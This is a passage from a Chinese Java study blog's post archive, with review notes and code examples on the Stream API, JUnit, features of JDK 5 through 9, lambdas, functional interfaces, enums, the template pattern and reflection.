.filter(name-&gt;name.startsWith(\"张\")) .filter(name-&gt;name.length()==3) .forEach(name-&gt; System.out.println(name));&#125; 流式思想概述 整体来讲，流式思想类似于车间的“生产流水线” 当我们需要对多个元素进行操作（特别是多步操作）的时候，考虑到性能以及遍历性，我们应该首先拼好一个“模型”步骤的方案，然后再去按照这个方案去执行它。 其实Stream流中的元素是一个特定类型的对象，这个类型由自己定义，可以通过泛型给它，在底层形成一个队列。 并且在java中Stream并不会储存元素，而是按需计算。它数据源 流的来源可以是集合，数组等 ps：“Stream流”其实是一个集合元素的函数模型，它并不是集合，也不是数据结构，其本身并不存储任何元素（或其地址值）。 使用Stream流的步骤 1、获取一个数据源 2、数据转换（如何转换、转换成什么自己定义） 3、获取想要的结果 ps：每次转换 原有的 Stream 对象不会改变，但是会返回一个新的 Stream 对象（可以有多次转换），这样就可以像链条一样的排列，可以理解为链式编程，也可以理解为linux系统中的 管道 “|” 命令。 获取一个Stream流 java.util.stream.Stream是java 8新加入的最常用的流接口（它不是函数式接口），我们使用Stream流都是通过它 获取一个Stream流有两种方式 1、所有的Collection 集合都可以通过stream()默认方法获取流 12345678910111213141516171819//把集合转换为Stream流List&lt;String&gt; list = new ArrayList&lt;&gt;();Stream&lt;String&gt; stream1 = list.stream();Set&lt;String&gt; set = new HashSet&lt;&gt;();Stream&lt;String&gt; stream2 = set.stream();Map&lt;String,String&gt; map = new HashMap&lt;&gt;();//获取键,存储到一个Set集合中Set&lt;String&gt; keySet = map.keySet();Stream&lt;String&gt; stream3 = keySet.stream();//获取值,存储到一个Collection集合中Collection&lt;String&gt; values = map.values();Stream&lt;String&gt; stream4 = values.stream();//获取键值对(键与值的映射关系 entrySet)Set&lt;Map.Entry&lt;String, String&gt;&gt; entries = map.entrySet();Stream&lt;Map.Entry&lt;String, String&gt;&gt; stream5 = entries.stream(); 2、Stream接口中的 “of” 静态方法可以获取数组对应的流 1234567//把数组转换为Stream流 Stream&lt;Integer&gt; stream6 = Stream.of(1, 2, 3, 4, 5); //可变参数可以传递数组 Integer[] arr = &#123;1,2,3,4,5&#125;; Stream&lt;Integer&gt; stream7 = Stream.of(arr); String[] arr2 = &#123;\"a\",\"bb\",\"ccc\"&#125;; Stream&lt;String&gt; stream8 = Stream.of(arr2); Stream接口的常用方法延迟方法 返回值仍然是Stream接口自身类型对象，所以它支持链式调用 1、过滤：filter 可以通过filter方法将一个流转换成另一个子集流1Stream&lt;T&gt; filter(Predicate&lt;? super T&gt; predicate); 它接收一个Predicate函数式接口（可以是一个Lambda或者方法引用），作为筛选条件 Predicate接口 它其中有一个抽象方法：test()； 它会产生一个boolean，代表指定的条件是否满足，满足为true，这样Stream流的filter会留着当前元素，否则就放弃当前元素 例子12345678import java.util.stream.Stream;public class Demo07StreamFilter &#123;public static void main(String[] args) &#123; Stream&lt;String&gt; original = Stream.of(\"张无忌\", \"张三丰\", \"周芷若\"); Stream&lt;String&gt; result = original.filter(s ‐&gt; s.startsWith(\"张\")); //结果：张无忌、张三丰 &#125;&#125; 2、映射：map 如果需要将流中的元素映射到另一个流中，我们就需要使用到map方法1&lt;R&gt; Stream&lt;R&gt; map(Function&lt;? super T, ? extends R&gt; mapper); 此接口需要一个Function函数式接口的参数，可以把T类型数据转换成R类型数据 Function接口 它是一个函数式接口，它有一个抽象方法：R apply(T t);它可以把T类型的数据转换为R类型的数据，这样就被称为“映射” 例子12345678910import java.util.stream.Stream;public class Demo08StreamMap &#123;public static void main(String[] args) &#123; Stream&lt;String&gt; original = Stream.of(\"10\", \"12\", \"18\"); //定义一个String类型的数组，然后获取它的Stream流 Stream&lt;Integer&gt; result = original.map(str‐&gt;Integer.parseInt(str)); //把String类型的Stream流转换成Integer类型的Stream流 &#125;&#125; 3、取用前几个元素：limit limit方法可以对流进行截取，只取用前n个,如果集合当前长度大于参数则进行截取,否则不进行操作1Stream&lt;T&gt; limit(long maxSize); 例子123456789import java.util.stream.Stream;public class Demo10StreamLimit &#123;public static void main(String[] args) &#123; Stream&lt;String&gt; original = Stream.of(\"张无忌\", \"张三丰\", \"周芷若\"); Stream&lt;String&gt; result = original.limit(2); System.out.println(result.count()); // 2 &#125;&#125; 4、跳过前几个元素：skip 流中集合总数大于n才会跳过n个，否则会得到一个长度为0的空流1Stream&lt;T&gt; skip(long n); 例子123456789import java.util.stream.Stream;public class Demo11StreamSkip &#123;public static void main(String[] args) &#123; Stream&lt;String&gt; original = Stream.of(\"张无忌\", \"张三丰\", \"周芷若\"); Stream&lt;String&gt; result = original.skip(2); System.out.println(result.count()); // 1 &#125;&#125; 5、组合：concat 如果有两个流想合并成一个流，那么就可以使用concat方法,它是一个静态方法 1static &lt;T&gt; Stream&lt;T&gt; concat(Stream&lt;? extends T&gt; a, Stream&lt;? extends T&gt; b) 例子12345678import java.util.stream.Stream;public class Demo12StreamConcat &#123;public static void main(String[] args) &#123; Stream&lt;String&gt; streamA = Stream.of(\"张无忌\"); Stream&lt;String&gt; streamB = Stream.of(\"张翠山\"); Stream&lt;String&gt; result = Stream.concat(streamA, streamB); &#125;&#125; 终结方法 返回的不是Stream接口自身类型对象了，所以不支持链式调用 1、逐一处理：forEach 它虽然叫forEach，但是与for循环中的“for-each”是不同的1void forEach(Consumer&lt;? super T&gt; action); 该方法接收一个Consumer接口类型的函数，会将每一个流元素交给函数进行处理 什么是Consumer接口？ 它是一个消费型接口接口中有一个抽象方法：accept(),它的意思是消费一个指定的泛型数据 例子，遍历流中的数据12345678910import java.util.stream.Stream;public class Demo12StreamForEach &#123;public static void main(String[] args) &#123; Stream&lt;String&gt; stream = Stream.of(\"张无忌\", \"张三丰\", \"周芷若\"); //从数组中获取Stream流 stream.forEach(name‐&gt; System.out.println(name)); //利用forEach逐一处理Stream流中的每个数据 &#125;&#125; 2、统计个数：count 正如Collection集合中的size方法一样，count它是数一数Stream流中的元素个数，它返回一个long类型数据 例子123456789import java.util.stream.Stream;public class Demo09StreamCount &#123;public static void main(String[] args) &#123;Stream&lt;String&gt; original = Stream.of(\"张无忌\", \"张三丰\", \"周芷若\"); Stream&lt;String&gt; result = original.filter(s ‐&gt; s.startsWith(\"张\")); System.out.println(result.count()); // 2 &#125;&#125; Stream流的特点 Stream流属于管道流，只能被消费（使用）一次 第一个Stream流调用完方法后，数据就会被流转到下一个Stream上这时第一个Stream流已经使用完毕了，就会关闭了所以第一个Stream流就不能再调用方法了可以想象成一个流水线，它是一直流下去的，流下去就没了嘛。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Stream流","slug":"Stream流","permalink":"http://liuhaoan.github.io/tags/Stream流/"},{"name":"JDK8新特性","slug":"JDK8新特性","permalink":"http://liuhaoan.github.io/tags/JDK8新特性/"},{"name":"forEach","slug":"forEach","permalink":"http://liuhaoan.github.io/tags/forEach/"}]},{"title":"javaSE复习之——Junit单元测试","slug":"javaSE复习之——Junit单元测试","date":"2019-04-11T07:20:44.000Z","updated":"2019-04-11T07:26:30.702Z","comments":true,"path":"2019/04/11/javaSE复习之——Junit单元测试/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——Junit单元测试/","excerpt":"Junit：单元测试概念： 单独测试某个方法的运行，不需要main方法即可直接在被测试的方法处运行 测试分类： 黑盒测试 不需要写代码，给输入值，看程序是否能输出期望的值 白盒测试 需要写代码，关注程序的具体执行流程，ps：Junit是属于白盒测试","text":"Junit：单元测试概念： 单独测试某个方法的运行，不需要main方法即可直接在被测试的方法处运行 测试分类： 黑盒测试 不需要写代码，给输入值，看程序是否能输出期望的值 白盒测试 需要写代码，关注程序的具体执行流程，ps：Junit是属于白盒测试 Junit的使用：白盒测试 步骤 定义一个测试类（测试用的例子）建议：测试包名： 被测试的类名 calcullatorTest包名： xxx.xxx.xxx.Test 定义测试方法：可以独立运行建议：方法名： test测试的方法名返回值： void参数列表： 空参 给方法加@Test注解ps:给方法加上@Test注解即可直接在该方法开始运行，此方法不需要式main方法 Junit之断言 方法 Assert.assertEquals( 期望的结果， 运算的结果) ps： 期望结果与运算结果相同则显示绿色，否则红色。 Junit实例 123456@Testpublic void testSub() &#123; int i = 1 + 1; Assert.assertEquals(3, i);&#125;//Junit工具会显示红色的，因为预期和结果不同 补充 @Before： 修饰的方法会在测试 方法被执行前执行，可以用来初始化一些东西 @After： 修饰 的方法会在测试方法执行之后自动执行，可以做一些关闭流之类的操作","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"Junit单元测试","slug":"Junit单元测试","permalink":"http://liuhaoan.github.io/tags/Junit单元测试/"}]},{"title":"javaSE复习之——JDK9新特性","slug":"javaSE复习之——JDK9新特性","date":"2019-04-11T07:14:10.000Z","updated":"2019-04-11T07:15:32.089Z","comments":true,"path":"2019/04/11/javaSE复习之——JDK9新特性/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——JDK9新特性/","excerpt":"","text":"list、set、map接口新增了一个方法“of” of作用可以给集合一次性添加多个元素 使用前提：当集合中的元素个数已经确定了，不在改变时使用 注意事项：1、of方法只适用于list、set、map接口，不适用于它的实现类，hashSet等2、of方法的返回值是一个不能改变的集合，集合不能再使用add、put方法添加元素3、set、map几口在调用of方法的时候，不能有重复的元素","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[]},{"title":"javaSE复习之——JDK8新特性","slug":"javaSE复习之——JDK8新特性","date":"2019-04-11T06:46:00.000Z","updated":"2019-04-11T07:19:15.622Z","comments":true,"path":"2019/04/11/javaSE复习之——JDK8新特性/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——JDK8新特性/","excerpt":"JDK8新特性总汇 Lambda表达式和函数式接口 Lambda表达式（也称为闭包）是Java 8中最大和最令人期待的语言改变。它允许我们将函数当成参数传递给某个方法，或者把代码本身当作数据处理 接口的默认方法和静态方法 默认方法和抽象方法之间的区别在于抽象方法需要实现，而默认方法不需要。接口提供的默认方法会被接口的实现类继承或者覆写","text":"JDK8新特性总汇 Lambda表达式和函数式接口 Lambda表达式（也称为闭包）是Java 8中最大和最令人期待的语言改变。它允许我们将函数当成参数传递给某个方法，或者把代码本身当作数据处理 接口的默认方法和静态方法 默认方法和抽象方法之间的区别在于抽象方法需要实现，而默认方法不需要。接口提供的默认方法会被接口的实现类继承或者覆写 方法引用 重复注解 自从Java 5中引入注解以来，这个特性开始变得非常流行，并在各个框架和项目中被广泛使用。不过，注解有一个很大的限制是：在同一个地方不能多次使用同一个注解。Java 8打破了这个限制，引入了重复注解的概念，允许在同一个地方多次使用同一个注解 更好的类型推断 就是创建有泛型类的对象时，后面不用写类型 拓宽注解的应用场景 Java 8拓宽了注解的应用场景。现在，注解几乎可以使用在任何元素上：局部变量、接口类型、超类和接口实现类，甚至可以用在函数的异常定义上。 Stream流 说到Stream便容易想到I/O Stream，而实际上，谁规定“流”一定是“IO流”呢？ 在Java 8中，得益于Lambda所带来的的函数式编程，引入了一个全新的Stream概念，用于解决已有集合类库所有的弊端 在接口中可以定义有方法体的方法，如果是非静态的，必须使用default，如果是静态的就不用了 例子：123456789interface Inter &#123; public default void print（） &#123; System.out.println(\"hello\") &#125; public static void method() &#123; System.out.print(\"static Method\") &#125;&#125; 在局部内部类中使用内部类以外的变量时，那个变量可以不用final修饰，他在jdk1.8版本之前是一定要用final修饰的 ps： 其实这就是一个语法糖，底层它还是用final修饰了的 为什么需要使用final修饰？ 答： 因为不用final修饰可能出现数据不一致的问题，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。ps：底层详情参考javaSE复习之——面向对象_内部类 数据不一致问题的解决方法就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因 函数式 接口 的概述 它有且只有一个抽象方法的接口，它适用于函数式编程，也就是函数式接口就是适用于lambda使用的接口，只有确保接口中有且只有一个抽象方法，java中的lambda才能顺利的推导 函数式 编程 的概述 就是使用lambda编程 PS： “语法糖”是指使用更加方便，但是原理不变的代码语法。例如遍历集合时使用的for-each语法，其实底层实现原理是迭代器，这就是“语法糖”。从应用层面来讲，java中的Lambda可以被当做是匿名内部类的“语法糖”，但是二者在原理上是不同的 函数式接口的定义：1234修饰符 interface 接口名称 &#123; public abstract 返回值类型 方法名称 （可选参数信息）； //其他非抽象方法内容&#125; ps：接口中的抽象方法的 public abstract 是可以省略的 函数式接口的特点： 它有且只有一个抽象方法的 接口 函数式接口可以包含其他的方法， 比如 默认、静态、私有 正如我们所知，接口中可以定义多个抽象方法，而我们的函数式编程只能有一个抽象方法，那么如何确保某个接口中只有一个抽象方法呢？ 答 使用@FunctionalInterface注解，它的作用是检测接口是否是一个函数式接口 是编译成功 否编译失败1、接口中没有抽象方法2、抽象方法有多个 函数式接口的使用 作为方法的参数 和 返回值类型 例子： 作为参数： 123456//定义一个方法，参数使用函数式接口public static void show（MyInterface myInterface）&#123; myInterface.method();&#125;//main方法中调用：其实它重写了method方法，结果是打印helloshow(() -&gt; Sysytem.out.println(\"hello\")) 作为返回值类型： 如果返回值类型是函数式接口，那么我们可以返回匿名内部类，当然也可以返回一个lambda 常用的函数式接口（使用方法同理）Supplier接口 它包含一个无参的方法，T get（）。用来获取一个泛型参数指定类型的数据对象，它被称之为生产型接口，指定接口的泛型是什么类型，那么接口中的get方法就会产生一个什么类型的数据 例子：1234567//定义一个类public String getString(Supplier&lt;String&gt; sup) &#123; return sup.get()&#125;//调用String s = getString(() -&gt; \"Hello\") Consumer接口： Consumer接口正好与Supplier接口相反，它不是产生一个数据，而是消费一个数据，数据类型由泛型决定，它的抽象方法中有一个 void accept（T，t）意为消费一个指定泛型的数据 Consumer接口和Supplier接口的区别： 1、Consumer是消费2、Supplier是生产 什么是消费和生产： 消费： 我们传入一个变量供accept方法使用 生产： 我们利用lambda重写get方法，然后获取一个自己想要的值 默认方法：andThen 作用： 需要两个Consumer接口，可以吧两个Consumer接口组合到一起，再对数据进行消费 例如：我们要把s变量消费两次，这样写代码就重复了 12345Consumer&lt;String&gt; con1Consumer&lt;String&gt; con2String s = \"hello\";con1.accept(s);con2.accept(s); 我们可以这样（下面这段语句和上面是一样的效果）： 1con1.andThen(con2).accept(s); ps：这样就实现了组合消费注意：谁写在前面谁先消费 Predicate接口： 我们有时候需要对某种数据类型的数据进行判断，从而得到一个Boolean值得结果，我们就可以用到Predicate接口 Predicate接口中的方法： 抽象方法：test 用于条件判断 默认方法：and（&amp;&amp;与） 可以连接多个判断条件 默认方法：or（或） 可以连接多个判断条件 默认方法：negate（非，取反） 可以连接多个判断条件 例子：1234public static boolean checkString(String s, Predicate&lt;String&gt; pre1,Predicate&lt;String&gt; pre2)&#123; return pre1.and(pre2).test(s);//等价于return pre1.test(s) &amp;&amp; pre2.test(s);&#125; Function接口： 根据一个类型的数据，得到另一个类型的数据，前者为前置条件，后者为后置条件 Function接口中的方法： 抽象方法：R apply（T t） 根据类型T的参数获取类型R的结果，返回一个R类型数据 默认方法：andThen 用来进行组合操作，不过它与Consumer接口中的方法区别是，它执行完主方法后，可以把主方法中的的结果传给副方法 比如：fun1.andThen(fun2).apply(s) 其中s是String类型，fun1是把String转int，fun2是int转String 实例： 12345class Change &#123; public String change(String s, Function&lt;String, Integer&gt; fun1, Function&lt;Integer, String&gt; fun2) &#123; return fun1.andThen(fun2).apply(s); &#125;&#125; main方法调用： 12String str = new Change().change(\"100\", s -&gt; Integer.parseInt(s) + 10, integer -&gt; integer + \"\");System.out.println(str);","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"JDK8新特性","slug":"JDK8新特性","permalink":"http://liuhaoan.github.io/tags/JDK8新特性/"},{"name":"函数式编程","slug":"函数式编程","permalink":"http://liuhaoan.github.io/tags/函数式编程/"},{"name":"函数式接口","slug":"函数式接口","permalink":"http://liuhaoan.github.io/tags/函数式接口/"}]},{"title":"javaSE复习之——Lambda表达式","slug":"javaSE复习之——Lambda表达式","date":"2019-04-11T06:36:23.000Z","updated":"2019-04-11T06:45:39.099Z","comments":true,"path":"2019/04/11/javaSE复习之——Lambda表达式/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——Lambda表达式/","excerpt":"函数式编程思想：lamlbda（jdk8新特性） 在数学中，函数是有输入量，输出量的一套计算方案，相对而言面向对象过分强调“必须通过对象的形式来做事情”，而函数式编程则是尽量忽略面向对象的复杂语法–强调做什么，而不是以什么形式做","text":"函数式编程思想：lamlbda（jdk8新特性） 在数学中，函数是有输入量，输出量的一套计算方案，相对而言面向对象过分强调“必须通过对象的形式来做事情”，而函数式编程则是尽量忽略面向对象的复杂语法–强调做什么，而不是以什么形式做 面向对象思想 找一个对象，调用对象的方法帮我做事，也就是自己找人帮忙做事 函数式编程思想 只要能获取到结果，谁去做都可以，怎么做不重要，只在意结果。 举个很形象的例子：我是老板，我就是要完成这个项目的开发，至于谁去做，怎么做，都不关我的事，我只要结果 再举个例子：当我们创建线程的时候，用已知的方法，最简便的创建方法就是使用匿名内部类，而我们只要重写的run方法，而不是创建的那个匿名内部类 lambda表达式于匿名内部类区别 lambda因为不用创建class字节码文件，所以效率高于匿名内部类 使用匿名内部类创建一个线程123456new Thread() &#123; @Override public void run() &#123; &#125; &#125;.start(); 使用lambda创建一个线程123new Thread(() -&gt; &#123; &#125;).start(); ps：可以看出，使用lambda代码更加的简洁 lambda详解： ()：即run方法的参数，可以传也可以不传 -&gt;：代表前面的参数传递给后面的方法体，传递的意思 {}:里面放重写的run方法中的业务逻辑代码 标准格式： (参数列表) -&gt; {重写的方法中的代码} ps：lambda也可以有返回值 Lambda使用时的注意事项 1、使用Lambda必须要有接口，并且接口中有且只有一个抽象方法 2、使用Lambda必须有上下文推断，也就是方法的参数或者局部变量类型必须为Lambda对应接口的类型 ps：仅有一个抽象方法的接口，称为“函数式接口” lambda的省略方式 1、参数列表中的参数可以省略参数类型 2、代码块的{}可以省略，但只限于只有一条语句 3、return可以省略，直接一条语句返回一个值即可 4、分号可以省略 5、参数列表中只有一个参数可以省略括号ps：条需要省略一个就一定要全部都省略 lambda的延迟执行 有些场景的代码执行后，结果不一定会被使用，从而造成性能浪费。而lambda是延迟执行的，所以正好可以作为解决方案，用于提升性能 如何延迟执行？ 答： 使用lambda表达式时，必须有一个函数式接口（只有一个抽象方法的接口），我们使用lambda表达式时，只要不调用这个接口中的抽象方法，那么lambda表达式中的业务逻辑代码就不会执行 举个例子 不使用lambda： 一个方法中传入一个拼接的字符串，无论这个方法适不适用这个字符串，它都会有拼接的过程，如果判断条件不符合，不使用这个字符串的话，那么就造成了资源浪费 使用lambda： 让那个方法传的参数是一个函数式接口，我们在调用这个方法的时候，使用lambda表达式进行传参，这样在方法中只要因为某些原因不调用这个接口的方法，那么lambda表达式中传入的业务逻辑代码就不会被执行，这样就达到了提升性能的目的","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"JDK8新特性","slug":"JDK8新特性","permalink":"http://liuhaoan.github.io/tags/JDK8新特性/"},{"name":"Lambda表达式","slug":"Lambda表达式","permalink":"http://liuhaoan.github.io/tags/Lambda表达式/"}]},{"title":"javaSE复习之——JDK7新特性","slug":"javaSE复习之——JDK7新特性","date":"2019-04-11T06:33:06.000Z","updated":"2019-04-11T06:33:37.582Z","comments":true,"path":"2019/04/11/javaSE复习之——JDK7新特性/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——JDK7新特性/","excerpt":"","text":"JDK7新特性总汇 二进制字面量（比如0b110，它可以直接写出来，他代表二进制的110，也就是十进制的6） 数字字面量可以出现下划线（100_00写法不会错，它表示10000） switch 语句可以用字符串 泛型简化、菱形泛型 异常的多个catch可以合并，每个异常用 | 比如：catch（异常1 | 异常2） try-with-resources 语句（jdk1.7标准的异常处理代码，就是之前那个关流的）","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[]},{"title":"javaSE复习之——JDK5新特性","slug":"javaSE复习之——JDK5新特性","date":"2019-04-11T06:20:54.000Z","updated":"2019-04-11T06:32:42.092Z","comments":true,"path":"2019/04/11/javaSE复习之——JDK5新特性/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——JDK5新特性/","excerpt":"jdk5新特性总汇 自动拆箱装箱 泛型 可变参数 静态导入 增强for循环 互斥锁 枚举","text":"jdk5新特性总汇 自动拆箱装箱 泛型 可变参数 静态导入 增强for循环 互斥锁 枚举 枚举的概述 是指将变量的值一 一列出来，变量的值只限于枚举出来的值的范围。 举例：一周有7天，一年有12个月等 回想单例设计模式 单例类是一个类只能有一个实例，那么多例类就是一个类可以有多个实例，但不是无限个数的实例，而是有个数限制，这就是枚举类 ps：枚举类可以自己实现，也可以通过enum实现枚举类 枚举的注意事项 1、定义枚举类需要用关键字enum 2、所有枚举类都是Enum的子类 3、枚举的第一行上必须是枚举项，也就是案例中的MON等，最后一个枚举项的分号是可以省略的，如果有其他东西就不要省略，建议不省略 4、枚举类可以有抽象方法，但是枚举项必须重写该方法 5、枚举类可以有构造器，但是必须是private的 6、枚举可以在switch中使用 枚举类的常见方法： .ordinal 返回枚举常量的序数（也就是在枚举声明中的位置，从0开始） .compareTo(传入枚举项) 把两个枚举项进行比较，比较的是编号，也就是叙述 .name 获取实例名称 .valueOf(枚举字节码，枚举项名称) 通过枚举类的字节码文件与枚举项名称获取枚举项的实例 .values 获取所有枚举项，返回一个数组 自己实现枚举类案例123456789101112131415161718192021222324252627282930public abstract class Week3 &#123; public static final Week3 MON = new Week3(\"星期一\") &#123; public void show() &#123; System.out.println(\"星期一\"); &#125; &#125;; public static final Week3 TUE = new Week3(\"星期二\")&#123; public void show() &#123; System.out.println(\"星期二\"); &#125; &#125;; public static final Week3 WED = new Week3(\"星期三\")&#123; public void show() &#123; System.out.println(\"星期三\"); &#125; &#125;; private String name; private Week3(String name)&#123; this.name = name; &#125; //私有构造,不让其他类创建本类对象 public String getName() &#123; return name; &#125; public abstract void show();&#125; 通过enum来实现枚举1234567891011121314151617181920212223242526public enum Week3 &#123; MON(\"星期一\")&#123; public void show() &#123; System.out.println(\"星期一\"); &#125; &#125;,TUE(\"星期二\")&#123; public void show() &#123; System.out.println(\"星期二\"); &#125; &#125;,WED(\"星期三\")&#123; public void show() &#123; System.out.println(\"星期三\"); &#125; &#125;; private String name; private Week3(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public abstract void show(); &#125;","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"枚举","slug":"枚举","permalink":"http://liuhaoan.github.io/tags/枚举/"},{"name":"JDK5新特性","slug":"JDK5新特性","permalink":"http://liuhaoan.github.io/tags/JDK5新特性/"}]},{"title":"javaSE复习之——设计模式_模板设计模式(Template)","slug":"javaSE复习之——设计模式-模板设计模式-Template","date":"2019-04-11T02:10:39.000Z","updated":"2019-04-11T02:13:35.150Z","comments":true,"path":"2019/04/11/javaSE复习之——设计模式-模板设计模式-Template/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——设计模式-模板设计模式-Template/","excerpt":"模板设计模式的概述 就是定义一个算法的骨架，而将具体的算法延迟到子类中来实现 优点和缺点 优点 使用模板方法模式，在定义算法骨架的同时，可以很灵活的实现具体的算法，满足用户灵活多变的需求 缺点 如果算法骨架有修改的 话，则需要修改抽象类","text":"模板设计模式的概述 就是定义一个算法的骨架，而将具体的算法延迟到子类中来实现 优点和缺点 优点 使用模板方法模式，在定义算法骨架的同时，可以很灵活的实现具体的算法，满足用户灵活多变的需求 缺点 如果算法骨架有修改的 话，则需要修改抽象类 代码示例12345678910111213141516171819202122232425262728public static void main(String[] args) &#123; Demo d = new Demo(); System.out.println(d.getTime());&#125;abstract class GetTime &#123; public final long getTime() &#123; long start = System.currentTimeMillis(); code(); long end = System.currentTimeMillis(); return end - start; &#125; public abstract void code();&#125;class Demo extends GetTime &#123; @Override public void code() &#123; int i = 0; while(i &lt; 100000) &#123; System.out.println(\"x\"); i++; &#125; &#125;&#125; ps：当然也可以直接使用匿名内部类 已学设计模式总汇 装饰设计模式 单例设计模式 简单工厂设计模式 工厂方法设计模式 适配器设计模式 模板设计模式","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"设计模式","slug":"设计模式","permalink":"http://liuhaoan.github.io/tags/设计模式/"},{"name":"模板设计模式","slug":"模板设计模式","permalink":"http://liuhaoan.github.io/tags/模板设计模式/"},{"name":"Template","slug":"Template","permalink":"http://liuhaoan.github.io/tags/Template/"}]},{"title":"javaSE复习之——反射","slug":"javaSE复习之——反射","date":"2019-04-11T01:33:17.000Z","updated":"2019-04-11T02:08:49.008Z","comments":true,"path":"2019/04/11/javaSE复习之——反射/","link":"","permalink":"http://liuhaoan.github.io/2019/04/11/javaSE复习之——反射/","excerpt":"反射之——类的加载概述和加载时机 概述 当程序要使用某个类的时候，如果该类字节码文件还未被加载到内存中，则系统会通过加载、连接、初始化三个步骤来对这个类进行初始化 加载就是将class文件读入内存中，并为之创建一个class对象，任何类被使用时系统都会建立一个class对象 连接：1、验证：是否有正确的内部结构，并和其他类协调一致2、准备：负责为类的静态成员分配内存，并且设置默认初始化值3、解析：将类的二进制数据中的 符号引用 替换为直接引用 初始化就是默认初始化、显示初始化、构造方法初始化等一系列初始化","text":"反射之——类的加载概述和加载时机 概述 当程序要使用某个类的时候，如果该类字节码文件还未被加载到内存中，则系统会通过加载、连接、初始化三个步骤来对这个类进行初始化 加载就是将class文件读入内存中，并为之创建一个class对象，任何类被使用时系统都会建立一个class对象 连接：1、验证：是否有正确的内部结构，并和其他类协调一致2、准备：负责为类的静态成员分配内存，并且设置默认初始化值3、解析：将类的二进制数据中的 符号引用 替换为直接引用 初始化就是默认初始化、显示初始化、构造方法初始化等一系列初始化 加载时机： 1、创建该类的实例 2、访问该类的静态变量，或者为静态变量赋值 3、调用该类的静态方法 4、使用反射的方式来强制创建某个类或者接口对应的java.lang.Class对象 5、初始化某个类的子类（父类构造方法 &gt; 子类构造方法 编译看父类，运行看子类，也就是父类构造方法中访问某个方法，子类可以重写那个方法，让父类不调用自己的方法而调用子类重写的方法） 6、直接使用java.exe的命令来运行某个主类（需要运行当然要把类加载到内存中喽） 反射之——类加载器的概述和分类 概述 类接载其负责将.Class文件加载到内存中，并为之生成对应的Class对象，虽然我们不需要关心类的加载机制，但是了解这个机制能让我们更好的理解程序运行。 类加载器的分类： 1、Bootstrap ClassLoader 根类加载器 作用它也被称为引导类加载器，负责Java核心类的加载，比如System、String等，他们在JDK中LIB目录下的rt.jar文件中 2、Extension ClassLoader 扩展类加载器 作用负责JRE扩展目录中jar包的加载，也就是JDK中JRE的lib目录下的ext目录 3、System ClassLoader 系统类加载器 作用负责在jvm启动时加载来自Java 命令的class文件，以及classpath环境变量做指定的jar包和类路径 获取类字节码文件的三种方法 Class.forName（”包名加类名“） 类名.class 对象的引用.getClass() 反射之——读取配置文件获取类名、变量、方法的名字，来加载相应的类、变量、方法（框架技术的基本）：Class中的方法 Class.forName（） 它可以实现动态加载类 Class字节码文件的引用.newInstance（） 使用这个类无参构造方法创建实例对象 Class字节码文件的引用.getConstructor（有参构造传入数据类型的字节码，例如：int.class） 返回一个 Constructor 对象，它反映此 Class 对象所表示的类的指定公共构造方法 .getField(“变量名”) 返回一个 Field 对象，它反映此 Class 对象所表示的类或接口的指定 公共 成员字段(也就是成员变量之类的，但只限公有) .getDeclaredField（“变量名”） 返回一个 Field 对象，该对象反映此 Class 对象所表示的类或接口的指定 已声明 字段（只要声明就可以获取）。 .getMethod（“方法名”， 代参数的参数类型字节码） 返回一个 Method 对象，它反映此 Class 对象所表示的类或接口的指定 公共 成员 方法 .getDeclaredMethod（“方法名”， 代参数的参数类型字节码） 返回一个 Method 对象，它反映此 Class 对象所表示的类或接口的指定 已声明 成员 方法 Constructor中的方法： Class字节码文件的引用.newInstance（需要传入有参构造的数据） 创建一个对象有参构造的实例 Field中的方法： .set（需要修改的 变量 所在的类的引用， 需要修改成的值） .setAccessible(true); 让反射的对象在使用时应该取消 Java 语言访问检查 Method中的方法：提供关于类或接口上单独某个方法（以及如何访问该方法）的信息 .invoke(需要调用的 方法 所在的类的引用， 带参数的参数值) 调用该方法 例子1（利用反射创建空参构造的对象）1234567891011BufferedReader br = new BufferedReader(new FileReader(\"config.properties\"));//读取配置文件中的类名Class clazz = Class.forName(br.readLine());//获取该类的字节码文件Fruit f = (Fruit) clazz.newInstance();//利用字节码文件创建实例对象j.run(f);//调用对象中的方法 例子2（创建有参构造的反射）12345678Class clazz = Class.forName(\"com.heima.bean.Person\");Constructor c = clazz.getConstructor(String.class,int.class);//获取有参构造Person p = (Person) c.newInstance(\"张三\",23);//通过有参构造创建对象System.out.println(p); 例子3（通过反射获取成员变量，并且使用）12345678910111213141516171819202122Class clazz = Class.forName(\"com.heima.bean.Person\");Constructor c = clazz.getConstructor(String.class,int.class);//获取有参构造Person p = (Person) c.newInstance(\"张三\",23);//通过有参构造创建对象//Field f = clazz.getField(\"name\");//获取姓名字段//f.set(p, \"李四\");//修改姓名的值Field f = clazz.getDeclaredField(\"name\");//变量私有则暴力反射获取字段f.setAccessible(true);//去除私有权限f.set(p, 